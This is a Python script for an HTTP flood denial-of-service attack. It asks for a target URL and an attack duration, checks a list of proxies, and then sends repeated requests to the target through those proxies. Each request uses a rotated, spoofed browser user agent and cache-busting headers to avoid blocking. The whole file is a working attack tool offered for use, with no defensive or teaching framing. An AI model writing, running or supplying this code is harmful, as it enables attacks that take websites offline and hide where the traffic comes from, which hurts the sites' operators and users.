import asyncio
import logging
import random
import time
from datetime import datetime

import httpx

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger()


# Load Proxies and User Agents
def load_proxies(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()


def load_user_agents(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()


# Validate Proxies
async def validate_proxy(proxy):
    try:
        async with httpx.AsyncClient(proxies={'http://': f'http://{proxy}', 'https://': f'http://{proxy}'},
                                     timeout=5) as client:
            response = await client.get('https://httpbin.org/ip')
            if response.status_code == 200:
                return proxy
    except:
        return None


async def check_proxies(proxies):
    tasks = [validate_proxy(proxy) for proxy in proxies]
    validated_proxies = await asyncio.gather(*tasks)
    return [proxy for proxy in validated_proxies if proxy is not None]


# Counter
total_requests_sent = 0


async def send_request(url, user_agents, proxy=None):
    global total_requests_sent
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    start_time = datetime.now()
    async with httpx.AsyncClient(
            proxies={"http://": f"http://{proxy}", "https://": f"http://{proxy}"} if proxy else None) as client:
        try:
            await client.get(url, headers=headers)
            total_requests_sent += 1
            time_elapsed = (datetime.now() - start_time).total_seconds()
            logger.info(f"Request sent. Time elapsed: {time_elapsed:.2f}s, Total requests: {total_requests_sent}")
        except httpx.RequestError as e:
            logger.error(f"Request failed: {e}")
        except KeyboardInterrupt as k:
            logger.info(f"Request sent. Time elapsed: {time_elapsed:.2f}s, Total requests: {total_requests_sent}")


async def launch_attack(url, duration, user_agents, proxies):
    until = asyncio.get_event_loop().time() + duration
    tasks = []
    while asyncio.get_event_loop().time() < until:
        proxy = random.choice(proxies) if proxies else None
        task = send_request(url, user_agents, proxy)
        tasks.append(task)
        if len(tasks) >= 10:  # Limit the number of concurrent tasks
            await asyncio.gather(*tasks)
            tasks.clear()

    if tasks:
        await asyncio.gather(*tasks)


def start_attack(url, duration, user_agents, proxies):
    asyncio.run(launch_attack(url, duration, user_agents, proxies))


if __name__ == '__main__':
    url = input("Enter target URL: ")
    duration = int(input("Enter attack duration (seconds): "))

    proxies = load_proxies("proxies2.txt")
    user_agents = load_user_agents("user_agents.txt")

    valid_proxies = asyncio.run(check_proxies(proxies))
    print(f"Valid proxies: {len(valid_proxies)}")

    start_attack(url, duration, user_agents, valid_proxies)
